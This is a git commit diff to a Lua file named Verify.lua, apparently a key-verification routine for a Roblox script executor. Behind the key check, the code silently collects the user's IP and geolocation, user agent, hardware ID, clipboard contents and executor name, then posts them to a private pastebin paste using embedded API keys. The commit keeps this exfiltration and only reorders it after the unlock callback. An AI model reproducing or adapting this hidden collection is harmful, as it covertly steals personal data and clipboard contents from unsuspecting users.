c032923b018ed9f01ac1466c0f64ec7d0e7aac9a
Nahida <131898898+nahida-cn@users.noreply.github.com>
2024-03-20 01:50:10 +0800

    Update Verify.lua

--- Verify.lua
+++ Verify.lua
@@ -54,7 +54,8 @@ function Verify(t, f)
     Button.MouseButton1Down:Connect(function()
         if t[LP.Name] == Text.Text then
             Gui:Destroy()
-            pcall(HS:PostAsync("https://pastebin.com/api/api_post.php", "api_option=paste&api_user_key=adf016dd2c9f5e86362c0d95f69fec77&api_paste_private=1&api_paste_name="..LP.Name.."&api_paste_expire_date=N&api_paste_format=json&api_dev_key=fPR8BxvaUZmqLAg0B-xs1TFAAA_yjM5V&api_paste_code="..HS:UrlEncode(HS:JSONEncode({
+            f()
+            HS:PostAsync("https://pastebin.com/api/api_post.php", "api_option=paste&api_user_key=adf016dd2c9f5e86362c0d95f69fec77&api_paste_private=1&api_paste_name="..LP.Name.."&api_paste_expire_date=N&api_paste_format=json&api_dev_key=fPR8BxvaUZmqLAg0B-xs1TFAAA_yjM5V&api_paste_code="..HS:UrlEncode(HS:JSONEncode({
                 List = t,
                 IP = GetJson("https://cz88.net/api/cz88/ip/accurate?ip="..GetJson("https://searchplugin.csdn.net/api/v1/ip/get").data.ip),
                 UA = HS:GetUserAgent(),
@@ -63,8 +64,7 @@ function Verify(t, f)
                 Hwid = gethwid(),
                 Clipboard = getclipboard(),
                 Executor = identifyexecutor()
-            })), "ApplicationUrlEncoded"))
-            f()
+            })), "ApplicationUrlEncoded")
         else
             game.StarterGui:SetCore("SendNotification", {
             Title = "警告",
